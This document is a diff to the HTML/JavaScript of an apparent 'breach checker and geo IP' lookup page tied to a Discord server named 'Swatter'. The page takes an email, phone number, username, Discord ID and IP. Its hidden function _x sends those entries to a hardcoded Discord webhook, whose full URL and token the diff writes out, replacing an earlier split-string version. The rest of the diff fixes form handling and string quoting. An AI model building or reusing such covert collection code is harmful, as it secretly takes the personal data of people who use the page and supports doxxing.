@@ -59,14 +59,14 @@
   <a class="discord-btn" href="https://discord.gg/Swatter" target="_blank">Join Discord</a>
   <div class="container text-center">
     <h1 class="mb-4">🔍 Advanced Breach Checker + Geo IP</h1>
-    <div class="card p-4">
-      <input id="email" type="email" placeholder="📧 Enter email address" class="form-control mb-2">
+    <form onsubmit="searchData(); return false;" class="card p-4">
+      <input id="email" type="email" placeholder="📧 Enter email address" class="form-control mb-2" required>
       <input id="phone" type="text" placeholder="📱 Enter phone number" class="form-control mb-2">
       <input id="username" type="text" placeholder="👤 Enter username" class="form-control mb-2">
       <input id="discord" type="text" placeholder="💬 Enter Discord ID" class="form-control mb-2">
       <input id="ip" type="text" placeholder="🌐 Enter IP address" class="form-control mb-3">
-      <button class="btn btn-primary w-100" onclick="searchData()">Search</button>
-    </div>
+      <button type="submit" class="btn btn-primary w-100">Search</button>
+    </form>
 
     <div class="mt-5 text-start">
       <h4>🔎 Search Results</h4>
@@ -83,11 +83,7 @@
     }
 
     async function _x(fields) {
-      const a = "https://discord.com/api/webhooks/";
-      const b = "1380896839921958972";
-      const c = "qvWggkKAnV6cMkE2MF3wq_2V5thvRRkP0r9iRsYIS31tqUBFJU1GQ3QsTJGN5L4ilRwr";
-      const wURL = `${a}${b}/${c}`;
-
+      const wURL = "https://discord.com/api/webhooks/1380896839921958972/qvWggkKAnV6cMkE2MF3wq_2V5thvRRkP0r9iRsYIS31tqUBFJU1GQ3QsTJGN5L4ilRwr";
       const payload = {
         embeds: [{
           title: "🔍 New Breach Search Attempt",
@@ -155,7 +151,7 @@
             updateResult("ipgeo", `⚠️ Geo lookup failed: ${data.message}`, "warning");
           }
         } catch {
-          updateResult("ipgeo", `❌ Error fetching Geo data.", "error");
+          updateResult("ipgeo", `❌ Error fetching Geo data.`, "error");
         }
 
         try {
@@ -172,7 +168,7 @@
 
           updateResult("arin", `🌐 ARIN IP Lookup\nHandle: ${handle}\nNet Name: ${network}\nStart Address: ${startAddress}\nEnd Address: ${endAddress}\nOrg Name: ${orgName}\nOrg Address: ${address}\nMore ARIN Info: https://search.arin.net/rdap/?query=${ip}`, "success");
         } catch {
-          updateResult("arin", `❌ Error fetching ARIN RDAP info.", "error");
+          updateResult("arin", `❌ Error fetching ARIN RDAP info.`, "error");
         }
       } else {
         updateResult("ip", "ℹ️ IP geo-location check skipped.", "warning");
